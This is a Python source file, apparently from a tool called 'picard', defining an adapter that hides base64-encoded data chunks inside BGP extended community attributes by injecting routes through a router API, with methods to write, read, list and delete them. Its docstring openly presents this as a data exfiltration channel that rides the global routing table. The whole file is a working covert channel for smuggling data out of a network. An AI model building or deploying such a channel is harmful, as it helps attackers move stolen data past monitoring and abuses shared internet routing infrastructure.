"""BGP adapter — store chunks in BGP extended community attributes.

Injects routes with chunk data encoded as extended communities via
a router API (ExaBGP HTTP, GoBGP gRPC, or FRRouting).  Reading queries
the RIB for routes with matching community tags.

Data exfil insight: BGP announcements propagate across autonomous
systems.  A chunk hidden in an extended community rides the global
routing table.

Requires: pip install picard[bgp]  (aiohttp)
"""

from __future__ import annotations

import asyncio
import base64
import uuid
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef


class BgpAdapter(Adapter):
    """Scatter chunks into BGP extended community attributes."""

    def __init__(
        self,
        api_url: str,
        local_as: int,
        *,
        router_host: str = "127.0.0.1",
        router_port: int = 179,
        neighbor_as: int | None = None,
        prefix_base: str = "198.18.0.0/24",
        max_chunk_bytes: int = 256,
    ) -> None:
        self._api_url = api_url.rstrip("/")
        self._local_as = local_as
        self._router_host = router_host
        self._router_port = router_port
        self._neighbor_as = neighbor_as or local_as
        self._prefix_base = prefix_base
        self._max = max_chunk_bytes

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="bgp",
            max_chunk_bytes=self._max,
            persistent=True,
            ordered=False,
            rate_limit_per_min=10,
        )

    def _chunk_key(self, encoded_chunk: str) -> str:
        from picard.chunker import Chunk
        try:
            chunk = Chunk.decode(encoded_chunk)
            return f"{chunk.manifest_id}_{chunk.block_index}_{chunk.chunk_index}"
        except (ValueError, Exception):
            return uuid.uuid4().hex

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        import aiohttp

        key = self._chunk_key(encoded_chunk)
        data_b64 = base64.b64encode(encoded_chunk.encode()).decode()
        community_tag = f"picard:{key[:32]}"
        payload = {
            "prefix": self._prefix_base,
            "community": community_tag,
            "data": data_b64,
            "local_as": self._local_as,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{self._api_url}/routes", json=payload
            ) as resp:
                resp.raise_for_status()

        loc = f"bgp://{self._router_host}/{self._prefix_base}/{community_tag}"
        return StoredChunkRef(adapter_name="bgp", location=loc)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        import aiohttp

        parts = ref.location.replace("bgp://", "").split("/", 2)
        community_tag = parts[2] if len(parts) > 2 else ""

        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"{self._api_url}/routes",
                params={"community": community_tag},
            ) as resp:
                resp.raise_for_status()
                result = await resp.json()

        data_b64 = result.get("data", "")
        return base64.b64decode(data_b64).decode()

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        import aiohttp

        parts = ref.location.replace("bgp://", "").split("/", 2)
        community_tag = parts[2] if len(parts) > 2 else ""

        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(
                    f"{self._api_url}/routes",
                    params={"community": community_tag},
                ) as resp:
                    return resp.status in (200, 204)
        except Exception:
            return False

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        import aiohttp

        prefix = f"picard:{manifest_id}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self._api_url}/routes",
                    params={"community_prefix": prefix},
                ) as resp:
                    resp.raise_for_status()
                    result = await resp.json()

            return [
                StoredChunkRef(
                    adapter_name="bgp",
                    location=f"bgp://{self._router_host}/{self._prefix_base}/{r['community']}",
                )
                for r in result.get("routes", [])
            ]
        except Exception:
            return []

    async def health_check(self) -> bool:
        import aiohttp

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self._api_url}/status") as resp:
                    return resp.status == 200
        except Exception:
            return False

    async def capacity(self) -> dict[str, int | None]:
        return {
            "used_bytes": None,
            "free_bytes": None,
            "total_bytes": None,
            "chunk_count": None,
        }
